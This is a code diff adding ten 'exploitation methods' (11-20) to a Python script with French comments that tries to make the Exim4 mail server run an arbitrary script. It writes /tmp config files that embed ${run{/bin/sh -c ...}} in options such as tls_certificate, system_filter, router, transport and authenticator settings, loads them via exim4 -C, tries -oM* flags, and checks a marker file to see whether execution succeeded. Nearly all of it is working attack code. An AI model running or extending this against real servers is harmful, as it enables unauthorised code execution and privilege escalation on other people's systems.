@@ -210,6 +210,136 @@ def method10(script_path, marker_file, marker_content):
 
 exploitation_methods.append(method10)
 
+# Méthode 11: Configuration avec tls_certificate
+def method11(script_path, marker_file, marker_content):
+    print("\n[+] Méthode 11: Configuration avec tls_certificate")
+    config_path = "/tmp/exim_exploit11.conf"
+    with open(config_path, "w") as f:
+        f.write(f"""tls_certificate = ${{run{{/bin/sh -c "{script_path}"}}}}
+""")
+    cmd = f"/usr/sbin/exim4 -C{config_path} -bV"
+    stdout, stderr, _ = run_command(cmd)
+    return check_success(marker_file, marker_content)
+
+exploitation_methods.append(method11)
+
+# Méthode 12: Configuration avec system_filter
+def method12(script_path, marker_file, marker_content):
+    print("\n[+] Méthode 12: Configuration avec system_filter")
+    config_path = "/tmp/exim_exploit12.conf"
+    with open(config_path, "w") as f:
+        f.write(f"""system_filter = ${{run{{/bin/sh -c "{script_path}"}}}}
+""")
+    cmd = f"/usr/sbin/exim4 -C{config_path} -bV"
+    stdout, stderr, _ = run_command(cmd)
+    return check_success(marker_file, marker_content)
+
+exploitation_methods.append(method12)
+
+# Méthode 13: Configuration avec router
+def method13(script_path, marker_file, marker_content):
+    print("\n[+] Méthode 13: Configuration avec router")
+    config_path = "/tmp/exim_exploit13.conf"
+    with open(config_path, "w") as f:
+        f.write(f"""primary_hostname = localhost
+
+begin routers
+  test_router:
+    driver = accept
+    domains = ${{run{{/bin/sh -c "{script_path}"}}}}
+    transport = local_delivery
+""")
+    cmd = f"/usr/sbin/exim4 -C{config_path} -bV"
+    stdout, stderr, _ = run_command(cmd)
+    return check_success(marker_file, marker_content)
+
+exploitation_methods.append(method13)
+
+# Méthode 14: Configuration avec transport
+def method14(script_path, marker_file, marker_content):
+    print("\n[+] Méthode 14: Configuration avec transport")
+    config_path = "/tmp/exim_exploit14.conf"
+    with open(config_path, "w") as f:
+        f.write(f"""primary_hostname = localhost
+
+begin transports
+  local_delivery:
+    driver = appendfile
+    file = ${{run{{/bin/sh -c "{script_path}"}}}}
+""")
+    cmd = f"/usr/sbin/exim4 -C{config_path} -bV"
+    stdout, stderr, _ = run_command(cmd)
+    return check_success(marker_file, marker_content)
+
+exploitation_methods.append(method14)
+
+# Méthode 15: Configuration avec authenticator
+def method15(script_path, marker_file, marker_content):
+    print("\n[+] Méthode 15: Configuration avec authenticator")
+    config_path = "/tmp/exim_exploit15.conf"
+    with open(config_path, "w") as f:
+        f.write(f"""primary_hostname = localhost
+
+begin authenticators
+  plain:
+    driver = plaintext
+    server_condition = ${{run{{/bin/sh -c "{script_path}"}}}}
+""")
+    cmd = f"/usr/sbin/exim4 -C{config_path} -bV"
+    stdout, stderr, _ = run_command(cmd)
+    return check_success(marker_file, marker_content)
+
+exploitation_methods.append(method15)
+
+# Méthode 16: Exim -bd option
+def method16(script_path, marker_file, marker_content):
+    print("\n[+] Méthode 16: Exim -bd option")
+    config_path = "/tmp/exim_exploit16.conf"
+    with open(config_path, "w") as f:
+        f.write(f"""daemon_startup_retries = ${{run{{/bin/sh -c "{script_path}"}}}}
+""")
+    cmd = f"/usr/sbin/exim4 -C{config_path} -bd -q1h"
+    stdout, stderr, _ = run_command(cmd)
+    return check_success(marker_file, marker_content)
+
+exploitation_methods.append(method16)
+
+# Méthode 17: Exim -oMr option
+def method17(script_path, marker_file, marker_content):
+    print("\n[+] Méthode 17: Exim -oMr option")
+    cmd = f"/usr/sbin/exim4 -oMr{script_path}"
+    stdout, stderr, _ = run_command(cmd)
+    return check_success(marker_file, marker_content)
+
+exploitation_methods.append(method17)
+
+# Méthode 18: Exim -oMs option
+def method18(script_path, marker_file, marker_content):
+    print("\n[+] Méthode 18: Exim -oMs option")
+    cmd = f"/usr/sbin/exim4 -oMs{script_path}"
+    stdout, stderr, _ = run_command(cmd)
+    return check_success(marker_file, marker_content)
+
+exploitation_methods.append(method18)
+
+# Méthode 19: Exim -oMa option
+def method19(script_path, marker_file, marker_content):
+    print("\n[+] Méthode 19: Exim -oMa option")
+    cmd = f"/usr/sbin/exim4 -oMa{script_path}"
+    stdout, stderr, _ = run_command(cmd)
+    return check_success(marker_file, marker_content)
+
+exploitation_methods.append(method19)
+
+# Méthode 20: Exim -oMi option
+def method20(script_path, marker_file, marker_content):
+    print("\n[+] Méthode 20: Exim -oMi option")
+    cmd = f"/usr/sbin/exim4 -oMi{script_path}"
+    stdout, stderr, _ = run_command(cmd)
+    return check_success(marker_file, marker_content)
+
+exploitation_methods.append(method20)
+
 # Exécuter toutes les méthodes d'exploitation
 def run_all_methods():
     marker_file, marker_content = create_random_marker()
